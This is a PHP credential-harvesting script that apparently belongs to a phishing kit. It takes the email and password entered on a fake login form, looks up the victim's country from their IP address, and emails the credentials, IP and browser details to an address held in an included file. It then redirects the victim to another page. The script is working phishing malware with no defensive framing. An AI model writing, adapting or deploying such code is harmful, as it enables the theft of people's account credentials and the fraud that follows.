<?php
session_start();
include "to.php";
$xsam = getenv("REMOTE_ADDR");
$xadoo = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$xsam");
$COUNTRY = $xadoo->geoplugin_countryName ;  
$ip = getenv("REMOTE_ADDR");
$Email	=	$_POST["user"];
$Pass	=	$_POST["pass"];
$browser             =   $_SERVER['HTTP_USER_AGENT'];

$Message =	"<b><font color='#000000' size='4.5px'>-----------{ <font color='#000000'>Others</font> }-----------</b><br>";
$Message .=	"<b> Email : </b><font color='#000000'>".$Email."</font><br>";
$Message .=	"<b> Pass : </b><font color='#000000'>".$Pass."</font><br>";
$Message .=	"<b>-----------{ <font color='#000000'><b>LOGIN INFOS</b></font>}-----------</b><br>";
$Message .=	"<b>IP Address : </b><a href='http://www.whoer.net/?IP=".$ip."'><font color='#000000'>".$ip."</font></a><br>";
$Message .=	"<b>User Agent  : </b><font color='#000000'>".$browser."</font><br>";
$Message .=	"<b>-----------{ <font color='#000000'><b>Others</b></font> }-----------</b></font><br>";

$Subject = "Others~ Login ~ From ~ [$ip] Country [$COUNTRY]";

$Headers = "From: D3J4VU <Vip@163.goooo>\r\n";
$Headers .= "MIME-Version: 1.0\r\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

mail($to,$Subject,$Message,$Headers);

header("location: ralcofa.php");

 
?>